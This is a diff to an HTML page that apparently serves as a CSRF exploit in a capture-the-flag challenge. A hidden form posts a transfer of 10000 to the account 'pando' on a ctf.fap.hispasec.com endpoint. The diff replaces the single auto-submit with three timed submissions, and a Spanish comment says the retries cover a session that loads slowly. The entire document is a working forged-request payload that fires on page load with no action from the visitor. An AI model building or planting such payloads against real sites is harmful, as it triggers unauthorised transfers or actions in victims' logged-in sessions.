@@ -1,13 +1,16 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
+    <form id="f" action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
       <input type="hidden" name="to" value="pando">
       <input type="hidden" name="amount" value="10000">
     </form>
 
     <script>
-      document.forms[0].submit();
+      // intenta varias veces por si la sesión tarda en cargar
+      setTimeout(() => document.getElementById('f').submit(), 1000);
+      setTimeout(() => document.getElementById('f').submit(), 3000);
+      setTimeout(() => document.getElementById('f').submit(), 6000);
     </script>
   </body>
 </html>
